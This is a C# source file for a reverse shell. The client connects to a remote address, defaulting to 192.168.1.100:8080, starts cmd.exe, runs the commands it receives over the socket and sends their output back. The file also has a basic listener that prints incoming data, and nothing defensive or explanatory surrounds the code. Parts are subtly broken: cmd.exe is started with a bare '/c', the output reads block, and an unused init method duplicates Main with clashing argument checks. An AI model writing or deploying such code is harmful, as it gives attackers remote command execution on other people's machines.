using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace ReverseShell
{
    class Program
    {
        static void init(string[] args)
        {
            // Parse command line arguments for server IP and port
            string remoteIP = "192.168.1.100";
            int remotePort = 8080;
            if (args.Length >= 2)
            {
                remoteIP = args[0];
                remotePort = int.Parse(args[1]);
            }

            // Check if we're running as a client (reverse shell) or server (Netcat listener)
            if (args.Length == 2)
            {
                // Reverse shell client
                StartReverseShell(remoteIP, remotePort);
            }
            else if (args.Length == 0)
            {
                // Netcat listener server
                StartNetcatListener(remotePort);
            }
            else
            {
                Console.WriteLine("Usage: ReverseShellNetcat <remote_ip> <remote_port> (for reverse shell client)");
                Console.WriteLine("Usage: ReverseShellNetcat <local_port> (for Netcat listener server)");
            }
        }

        static void StartReverseShell(string remoteIP, int remotePort)
        {
            // Create a new socket
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            // Connect to the remote server
            socket.Connect(remoteIP, remotePort);

            // Send a connection message to the server
            byte[] message = Encoding.ASCII.GetBytes("Connected to reverse shell!");
            socket.Send(message);

            // Start the shell
            StartShell(socket);
        }

        static void StartNetcatListener(int localPort)
        {
            // Create a new socket
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            // Bind the socket to a local endpoint
            IPEndPoint localEndPoint = new IPEndPoint(IPAddress.Any, localPort);
            socket.Bind(localEndPoint);

            // Listen for incoming connections
            socket.Listen(1);

            Console.WriteLine($"Waiting for incoming connections on port {localPort}...");

            // Accept an incoming connection
            Socket clientSocket = socket.Accept();

            Console.WriteLine("Received incoming connection!");

            // Start the Netcat listener
            StartNetcatListener(clientSocket);
        }

        static void StartShell(Socket socket)
        {
            // Create a new process for the shell
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();

            // Create a new thread for handling incoming commands
            Task.Factory.StartNew(() =>
            {
                while (true)
                {
                    // Receive incoming commands from the server
                    byte[] commandBuffer = new byte[1024];
                    int commandLength = socket.Receive(commandBuffer);
                    if (commandLength == 0)
                    {
                        break;
                    }
                    string command = Encoding.ASCII.GetString(commandBuffer, 0, commandLength);

                    // Execute the command and send the output back to the server
                    string output = ExecuteCommand(command, process);
                    byte[] outputBuffer = Encoding.ASCII.GetBytes(output);
                    socket.Send(outputBuffer);
                }
            });

            // Keep the main thread alive
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        static void StartNetcatListener(Socket socket)
        {
            // Create a new thread for handling incoming data
            Task.Factory.StartNew(() =>
            {
                while (true)
                {
                    // Receive incoming data from the client
                    byte[] dataBuffer = new byte[1024];
                    int dataLength = socket.Receive(dataBuffer);
                    if (dataLength == 0)
                    {
                        break;
                    }
                    string data = Encoding.ASCII.GetString(dataBuffer, 0, dataLength);

                    // Print the received data to the console
                    Console.Write(data);
                }
            });

            // Keep the main thread alive
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

       static string ExecuteCommand(string command, Process process)
{
    // Write the command to the process's standard input
    process.StandardInput.WriteLine(command);

    // Read the output from the process's standard output
    string output = process.StandardOutput.ReadToEnd();

    // Return the output
    return output;
}

static void Main(string[] args)
{
    // Parse command line arguments for server IP and port
    string remoteIP = "192.168.1.100";
    int remotePort = 8080;
    if (args.Length >= 2)
    {
        remoteIP = args[0];
        remotePort = int.Parse(args[1]);
    }

    // Check if we're running as a client (reverse shell) or server (Netcat listener)
    if (args.Length == 2)
    {
        // Reverse shell client
        StartReverseShell(remoteIP, remotePort);
    }
    else if (args.Length == 1)
    {
        // Netcat listener server
        StartNetcatListener(int.Parse(args[0]));
    }
    else
    {
        Console.WriteLine("Usage: ReverseShellNetcat <remote_ip> <remote_port> (for reverse shell client)");
        Console.WriteLine("Usage: ReverseShellNetcat <local_port> (for Netcat listener server)");
    }
}
    }
}